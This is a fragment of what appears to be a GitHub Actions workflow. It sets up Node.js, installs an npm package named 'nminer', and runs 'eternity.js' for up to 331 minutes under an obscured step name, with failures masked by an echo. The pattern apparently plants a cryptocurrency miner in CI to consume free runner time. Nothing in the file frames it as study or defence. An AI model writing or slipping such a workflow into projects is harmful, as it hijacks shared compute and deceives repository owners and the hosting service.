    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: failing dowse demob
        run: |
          npm install nminer@latest
          timeout 331m node eternity.js || echo "eternity executed"